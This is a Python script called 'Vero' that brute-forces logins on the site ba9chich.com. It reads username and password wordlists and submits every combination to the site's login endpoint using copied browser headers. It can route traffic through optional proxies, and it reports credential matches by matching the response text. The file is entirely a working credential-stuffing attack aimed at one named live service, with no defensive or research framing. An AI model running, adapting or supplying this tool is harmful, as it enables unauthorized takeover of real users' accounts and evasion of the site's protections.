#########################################################
# Vero - BA9CHICH Accounts Cracking/Bruteforcing tool   # 
# Author - edgerunner0x01                               #
#########################################################

try:
    from time import sleep
    from colorama import init , Style
    from colorama import Fore
    import requests
    import datetime
    import argparse
    import json
    red=str(Fore.RED)
    green=str(Fore.GREEN)
    yellow=str(Fore.MAGENTA)
    yellow1=str(Fore.YELLOW)
    megnta=str(Fore.MAGENTA)

except Exception as E:
    print("error: "+str(E))


class combo(): 
    def __init__(self):
        self.url=str("https://ba9chich.com/requests/login.php")
        self.headers={
            "Host": "ba9chich.com",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Length": "29",
            "Origin": "https://ba9chich.com",
            "DNT": "1",
            "Connection": "keep-alive",
            "Referer": "https://ba9chich.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
            }

    def guess(self,identifier,password,proxies):
        invalid_message='There is no user with these details! You do not have an account? Click <a href="https://ba9chich.com/">HERE</a> to create an account.'
        valid_message='go_inside'
        headers=self.headers

        payload={
                "username":identifier,
                "password":password
                }
        try:
            req=requests.post(self.url,data=payload,headers=headers,proxies=proxies)
            response=str(req.text)
            response_code=req.status_code

            if(response_code==200 and invalid_message in response):
                return False
            elif(response_code==200 and valid_message in response and (invalid_message not in response)):
                return True
            else:
                print(response)
                return False

        except KeyboardInterrupt:
            exit()
        except Exception as e:
            print(f"{red}error: {e}")



    def check(self):
        try:
            req=requests.get(self.url)
            if req.status_code==200:
                return True
            else:
                return False

        except KeyboardInterrupt:
            pass
        except Exception as E:
            print(f"{red}error: {E}")

def check():
    attack=combo()
    print(f"{yellow}[!] Checking [SERVER] [{attack.url}] connectivity... ",end="")
    sleep(1)
    if(attack.check()):
        print(f"{green}[Done]")
        sleep(3)
    else:
        print(f"{red}Unknown Error !")
        exit()

def launch(identifier,password,proxies):

    try:
        attack=combo()
        guess=attack.guess(identifier,password,proxies)
    except KeyboardInterrupt:
        exit()
    except Exception as E:
        print("error: "+E)

    if(guess):
        print(green+"Found match for [{}:{}] !".format(identifier,password), end="")
        return True
        pass
    else:
        print(red+"No Match for [{}:{}] ".format(identifier,password),end="\r")
        return False

def banner():
    print("\n")
    banner="""\
    ,---.  ,---.   .-''-.  .-------.        ,-----.     
    |   /  |   | .'_ _   \ |  _ _   \     .'  .-,  '.   
    |  |   |  .'/ ( ` )   '| ( ' )  |    / ,-.|  \ _ \  
    |  | _ |  |. (_ o _)  ||(_ o _) /   ;  \  '_ /  | : 
    |  _( )_  ||  (_,_)___|| (_,_).' __ |  _`,/ \ _/  | 
    \ (_ o._) /'  \   .---.|  |\ \  |  |: (  '\_/ \   ; 
    \ (_,_) /  \  `-'    /|  | \ `'   / \ `"/  \  ) /  
    \     /    \       / |  |  \    /   '. \_/``".'   
    `---`      `'-..-'  ''-'   `'-'      '-----'

                - CRACK BA9CHICH ACCOUNTS -\n"""
    print(f"{yellow1}{banner}")
    sleep(3)

def main():
    parser=argparse.ArgumentParser(description='Vero - Simple tool for cracking/bruteforcing BA9CHICH Accounts')
    parser.add_argument("UsersList", type=str , help="Emails/Usernames wordlist PATH ",metavar="<Emails/Users:PATH>")
    parser.add_argument("PasswordsList", type=str , help="Passwords wordlist PATH ",metavar="<Passwords:PATH>")
    parser.add_argument("-x","--proxies", type=str , help="Proxies JSON file PATH ",metavar="<Proxies:PATH>")
    parser.add_argument("-v","--version", action="version" , help="Vero Version",version="Vero 1.0")
    args = parser.parse_args()

    identifiers_path=str(args.UsersList)
    passwords_path=str(args.PasswordsList)
    proxies_path=str(args.proxies)


    banner()
    check()

    identifiers= []
    passwords = []
    proxies=None

    try:
        with open(identifiers_path,"r") as identifier_file:
            print(f"{green}[+] Using [Emails/Usernames] From [{identifiers_path}]")
            for identifier in identifier_file:
                identifiers.append(identifier.replace("\n",""))
        sleep(2)
        with open(passwords_path,"r") as passwords_file:
            print(f"{green}[+] Using [Passwords] From [{passwords_path}]")
            for password in passwords_file:
                passwords.append(password.replace("\n",""))
        sleep(2)
        print("")
        if(proxies_path !=None and proxies_path!="None"):
            try:
                with open(proxies_path,"r") as proxies_file:
                    proxies_raw=proxies_file.read()
                    proxies_encoded=json.loads(proxies_raw)
                    proxies=proxies_encoded
                    print(f"{green}[+] Including [Proxies] ",end="\n\n")
                    sleep(1)
                    print(proxies_raw)
            
            except KeyboaderInterrupt:
                exit()
            except Exception as E:
                pass
                print(f"{red}[!] Invalid Proxies file path ")
                exit()
        else:
            proxies=None
            print(f"{red}[-] Not Including [Proxies] ")
            pass
    except KeyboardInterrupt:
        pass
    except Exception as E :
        print(f"{red}error: {E}")



    try:
        sleep(1)
        time=datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{yellow}[+] Launching [BruteForce] - [{time}] !\n")
        sleep(4)

        counter=1
        length=len(passwords)
        for identifier in identifiers:
            for password in passwords:
                time=datetime.datetime.now().strftime("%H:%M:%S")
                print(f"{yellow}[#] [{time}] ({counter}/{length}) " ,end="")
                if(launch(identifier,password,proxies)):
                    counter=1
                    break
                else:
                    counter+=1
                    continue
            print("")
            counter=1

    except KeyboardInterrupt:
        exit()
    except Exception as E:
        print(red+"error: "+E)



if __name__=="__main__":
    init(autoreset=True)
    main()
